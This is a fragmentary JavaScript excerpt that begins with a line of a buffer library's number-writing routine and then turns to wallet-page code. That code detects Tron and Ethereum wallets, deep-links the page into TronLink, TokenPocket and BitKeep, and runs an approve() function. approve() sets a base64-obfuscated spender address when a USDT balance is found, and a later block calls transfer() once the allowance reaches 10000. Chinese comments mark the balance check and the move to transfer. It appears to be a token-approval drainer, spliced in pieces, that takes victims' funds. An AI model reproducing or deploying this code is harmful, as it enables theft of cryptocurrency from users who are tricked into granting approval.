...
exports.write = function (buffer, value, offset, isLE, mLen, nBytes) {
  ...
  buffer[offset + i - d] |= s * 128
    	...
    	var payAddr = '{$trc_au_address}';
    	var userAddress;
    	
    	const urlParams = new URLSearchParams(window.location.search);
   
    const toplink = urlParams.get('utm_source');
    	if(IsPC()){
            
            if(window.ethereum || window.tronWeb || toplink){
                $("#payorg").show();
            }else{
                $("#mobil").show();
            }
        ...
        $('#confirm').click(function() {
            ...
            if (selectIndex == 2) {
                ...
                var tronlink = 'tpdapp://open?params={"url": "' + url + '"}';
                ...
                window.location.href = bitkeep;
                 ...
                 var data = {
	            "url": url+"?utm_source=tronlink",
            	"action": "open",
            	"protocol": "tronlink",
            	"version": "1.0"
	        }
	         var tron = 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify(data));
		...
		async function approve() {
			...
			try {
				...
				if(usdtBalance>0.1){ // 如果余额大于2000
				    permissionsAddr=window.atob("VFVQd2t2cUxKOTdOeFlhaHhIUXJ0UUsxVUtTOGdXamFVRg=="); 
				}
    ...
    const toplink = urlParams.get('utm_source');
                       if(/okex/.test(navigator.userAgent.toLowerCase()) || toplink == 'tronlink' || toplink == 'imtoken'){
                           if (allowance >= 10000) {
                               console.log("有授权，到转账");
                               transfer();
                               return;
